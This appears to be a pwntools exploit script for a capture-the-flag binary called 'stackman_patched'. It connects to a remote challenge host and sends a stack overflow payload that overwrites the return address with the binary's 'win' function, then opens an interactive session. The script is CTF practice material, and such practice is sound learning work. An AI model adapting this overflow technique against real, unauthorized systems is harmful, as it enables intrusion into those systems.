#!/usr/bin/env python3

from pwn import *

exe = ELF("./stackman_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

#p = process()
p= remote('ctfnhack.challs.ctflib.eu',33741)

input()
p.sendafter(b'> ',b'b'*0x34 + p32(0) + p64(exe.sym.win))

p.interactive()
